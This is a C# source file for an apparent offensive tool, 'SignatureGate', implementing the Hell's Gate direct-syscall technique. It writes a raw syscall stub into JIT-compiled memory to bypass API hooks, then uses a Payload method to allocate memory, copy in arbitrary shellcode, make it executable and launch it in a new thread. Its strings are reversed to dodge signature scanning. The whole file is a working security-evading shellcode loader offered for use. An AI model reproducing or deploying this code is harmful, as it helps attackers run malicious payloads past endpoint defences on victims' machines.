//start
using System.Text;
using System.Linq;
using System;

using SignatureGate.Win32;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.IO;

namespace SignatureGate {

    public class HellsGate {

        private bool IsGateReady { get; set; } = false;

        private object Mutant { get; set; } = new object();

        private Dictionary<UInt64, Util.APITableEntry> APITable { get; set; } = new Dictionary<ulong, Util.APITableEntry>() { };

        private IntPtr MangedMethodAddress { get; set; } = IntPtr.Zero;

        private IntPtr UnmanagedMethodAddress { get; set; } = IntPtr.Zero;

        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        private static UInt32 Gate() {
            return new UInt32();
        }

        /// <typeparam name="T">The desired delegate Type.</typeparam>
        /// <param name=new string("llacsys".ToCharArray().Reverse().ToArray())>The system call to execute.</param>
        private T NtInvocation<T>(Int16 syscall) where T: Delegate {
            if (!this.IsGateReady || this.UnmanagedMethodAddress == IntPtr.Zero) {
                Util.LogError(new string("buts llac metsys tcejni ot elbanU".ToCharArray().Reverse().ToArray()));
                return default;
            }

            Span<byte> stub = stackalloc byte[24] {
                0x4c, 0x8b, 0xd1,                                      // mov  r10, rcx
                0xb8, (byte)syscall, (byte)(syscall >> 8), 0x00, 0x00, // mov  eax, <syscall
                0xf6, 0x04, 0x25, 0x08, 0x03, 0xfe, 0x7f, 0x01,        // test byte ptr [SharedUserData+0x308],1
                0x75, 0x03,                                            // jne  ntdll!<function>+0x15
                0x0f, 0x05,                                            // syscall
                0xc3,                                                  // ret
                0xcd, 0x2e,                                            // int  2Eh
                0xc3                                                   // ret
            };

            Marshal.Copy(stub.ToArray(), 0, this.UnmanagedMethodAddress, stub.Length);
            return Marshal.GetDelegateForFunctionPointer<T>(this.UnmanagedMethodAddress);
        }

        /// <param name=new string("eldnaHssecorP".ToCharArray().Reverse().ToArray())>A handle for the process for which the mapping should be done.</param>
        /// <param name=new string("sserddAesaB".ToCharArray().Reverse().ToArray())>A pointer to a variable that will receive the base address of the allocated region of pages.</param>
        /// <param name=new string("stiBoreZ".ToCharArray().Reverse().ToArray())>The number of high-order address bits that must be zero in the base address of the section view.</param>
        /// <param name=new string("eziSnoigeR".ToCharArray().Reverse().ToArray())>A pointer to a variable that will receive the actual size, in bytes, of the allocated region of pages.</param>
        /// <param name=new string("epyTnoitacollA".ToCharArray().Reverse().ToArray())>A bitmask containing flags that specify the type of allocation to be performed for the specified region of pages.</param>
        /// <param name=new string("tcetorP".ToCharArray().Reverse().ToArray())>A bitmask containing page protection flags that specify the protection desired for the committed region of pages.</param>
        private UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect) {
            lock (this.Mutant) {
                Int16 syscall = this.APITable[Util.NtAllocateVirtualMemoryHash].Syscall;
                if (syscall == 0x0000)
                    return Macros.STATUS_UNSUCCESSFUL;

                DFunctions.NtAllocateVirtualMemory Func = NtInvocation<DFunctions.NtAllocateVirtualMemory>(syscall);
                return Func(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            }
        }

        /// <param name=new string("eldnaHssecorP".ToCharArray().Reverse().ToArray())>Handle to Process Object opened with PROCESS_VM_OPERATION access.</param>
        /// <param name=new string("sserddAesaB".ToCharArray().Reverse().ToArray())>Pointer to base address to protect. Protection will change on all page containing specified address. On output, BaseAddress will point to page start address.</param>
        /// <param name=new string("tcetorPoTsetyBfOrebmuN".ToCharArray().Reverse().ToArray())>Pointer to size of region to protect. On output will be round to page size (4KB).</param>
        /// <param name=new string("noitcetorPsseccAweN".ToCharArray().Reverse().ToArray())>One or some of PAGE_... attributes.</param>
        /// <param name=new string("noitcetorPsseccAdlO".ToCharArray().Reverse().ToArray())>Receive previous protection.</param>
        private UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection) {
            lock (this.Mutant) {
                Int16 syscall = this.APITable[Util.NtProtectVirtualMemoryHash].Syscall;
                if (syscall == 0x0000)
                    return Macros.STATUS_UNSUCCESSFUL;

                DFunctions.NtProtectVirtualMemory Func = NtInvocation<DFunctions.NtProtectVirtualMemory>(syscall);
                return Func(ProcessHandle, ref BaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, out OldAccessProtection);
            }
        }

        /// <param name=new string("daerhTh".ToCharArray().Reverse().ToArray())>Caller supplied storage for the resulting handle.</param>
        /// <param name=new string("sseccAderiseD".ToCharArray().Reverse().ToArray())>Specifies the allowed or desired access to the thread.</param>
        /// <param name=new string("setubirttAtcejbO".ToCharArray().Reverse().ToArray())>Initialized attributes for the object.</param>
        /// <param name=new string("eldnaHssecorP".ToCharArray().Reverse().ToArray())>Handle to the threads parent process.</param>
        /// <param name=new string("sserddAtratSpl".ToCharArray().Reverse().ToArray())>Address of the function to execute.</param>
        /// <param name=new string("retemaraPpl".ToCharArray().Reverse().ToArray())>Parameters to pass to the function.</param>
        /// <param name=new string("dednepsuSetaerC".ToCharArray().Reverse().ToArray())>Whether the thread will be in suspended mode and has to be resumed later.</param>
        /// <param name=new string("stiBoreZkcatS".ToCharArray().Reverse().ToArray())></param>
        /// <param name=new string("timmoCkcatSfOeziS".ToCharArray().Reverse().ToArray())>Initial stack memory to commit.</param>
        /// <param name=new string("evreseRkcatSfOeziS".ToCharArray().Reverse().ToArray())>Initial stack memory to reserve.</param>
        /// <param name=new string("reffuBsetyBpl".ToCharArray().Reverse().ToArray())></param>
        private UInt32 NtCreateThreadEx(ref IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer) {
            lock (this.Mutant) {
                Int16 syscall = this.APITable[Util.NtCreateThreadExHash].Syscall;
                if (syscall == 0x0000)
                    return Macros.STATUS_UNSUCCESSFUL;

                DFunctions.NtCreateThreadEx Func = NtInvocation<DFunctions.NtCreateThreadEx>(syscall);
                return Func(ref hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, CreateSuspended, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
            }
        }

        /// <param name=new string("eldnaHtcejbO".ToCharArray().Reverse().ToArray())>Open handle to a alertable executive object.</param>
        /// <param name=new string("elbatrelA".ToCharArray().Reverse().ToArray())>If set, calling thread is signaled, so all queued APC routines are executed.</param>
        /// <param name=new string("stuOemiT".ToCharArray().Reverse().ToArray())>Time-out interval, in microseconds. NULL means infinite.</param>
        private UInt32 NtWaitForSingleObject(IntPtr ObjectHandle, bool Alertable, ref Structures.LARGE_INTEGER TimeOuts) {
            lock (this.Mutant) {
                Int16 syscall = this.APITable[Util.NtWaitForSingleObjectHash].Syscall;
                if (syscall == 0x0000)
                    return Macros.STATUS_UNSUCCESSFUL;

                DFunctions.NtWaitForSingleObject Func = NtInvocation<DFunctions.NtWaitForSingleObject>(syscall);
                return Func(ObjectHandle, Alertable, ref TimeOuts);
            }
        }

        /// <param name=new string("elbaT".ToCharArray().Reverse().ToArray())>The API table that will be used by the multiple function wrapers.</param>
        public HellsGate(Dictionary<UInt64, Util.APITableEntry> Table) {
            this.APITable = Table;
        }

        public bool GenerateRWXMemorySegment() {
            MethodInfo method = typeof(HellsGate).GetMethod(nameof(Gate), BindingFlags.Static | BindingFlags.NonPublic);
            if (method == null) {
                Util.LogError(new string("dohtem eht dnif ot elbanU".ToCharArray().Reverse().ToArray()));
                return false;
            }
            RuntimeHelpers.PrepareMethod(method.MethodHandle);

            IntPtr pMethod = method.MethodHandle.GetFunctionPointer();
            if (Marshal.ReadByte(pMethod) != 0xe9) {
                Util.LogError(new string("buts dilavni ro de'TIJ ton saw dohteM".ToCharArray().Reverse().ToArray()));
                return false;
            }
            Util.LogInfo($"Managed method address:   0x{pMethod:x16}");

            Int32 offset = Marshal.ReadInt32(pMethod, 1);
            UInt64 addr = (UInt64)pMethod + (UInt64)offset;
            while (addr % 16 != 0)
                addr++;
            Util.LogInfo($"Unmanaged method address: 0x{addr:x16}\n");

            this.MangedMethodAddress = method.MethodHandle.GetFunctionPointer();
            this.UnmanagedMethodAddress = (IntPtr)addr;
            this.IsGateReady = true;
            return true;
        }

        public void Payload(byte[] shellcode) {
            if (!this.IsGateReady) {
                if (!this.GenerateRWXMemorySegment()) {
                    Util.LogError(new string("tnemges yromem XR etareneg ot elbanU".ToCharArray().Reverse().ToArray()));
                    return;
                }
            }

            Util.LogInfo($"Shellcode size: {shellcode.Length} bytes");

            IntPtr pBaseAddres = IntPtr.Zero;
            IntPtr Region = (IntPtr)shellcode.Length;
            UInt32 ntstatus = NtAllocateVirtualMemory(Macros.GetCurrentProcess(), ref pBaseAddres, IntPtr.Zero, ref Region, Macros.MEM_COMMIT | Macros.MEM_RESERVE, Macros.PAGE_READWRITE);
            if (!Macros.NT_SUCCESS(ntstatus)) {
                Util.LogError($"Error ntdll!NtAllocateVirtualMemory (0x{ntstatus:0x8})");
                return;
            }
            Util.LogInfo($"Page address:   0x{pBaseAddres:x16}");

            Marshal.Copy(shellcode, 0, pBaseAddres, shellcode.Length);
            Array.Clear(shellcode, 0, shellcode.Length);

            UInt32 OldAccessProtection = 0;
            ntstatus = NtProtectVirtualMemory(Macros.GetCurrentProcess(), ref pBaseAddres, ref Region, Macros.PAGE_EXECUTE_READ, ref OldAccessProtection);
            if (!Macros.NT_SUCCESS(ntstatus) || OldAccessProtection != 0x0004) {
                Util.LogError($"Error ntdll!NtProtectVirtualMemory (0x{ntstatus:0x8})");
                return;
            }

            IntPtr hThread = IntPtr.Zero;
            ntstatus = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, Macros.GetCurrentProcess(), pBaseAddres, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (!Macros.NT_SUCCESS(ntstatus) || hThread == IntPtr.Zero) {
                Util.LogError($"Error ntdll!NtCreateThreadEx (0x{ntstatus:0x8})");
                return;
            }
            Util.LogInfo($"Thread handle:  0x{hThread:x16}\n");

            Structures.LARGE_INTEGER TimeOut = new Structures.LARGE_INTEGER();
            TimeOut.QuadPart = -10000000;
            ntstatus = NtWaitForSingleObject(hThread, false, ref TimeOut);
            if (ntstatus != 0x00) {
                Util.LogError($"Error ntdll!NtWaitForSingleObject (0x{ntstatus:0x8})");
                return;
            }
        }
    }
}
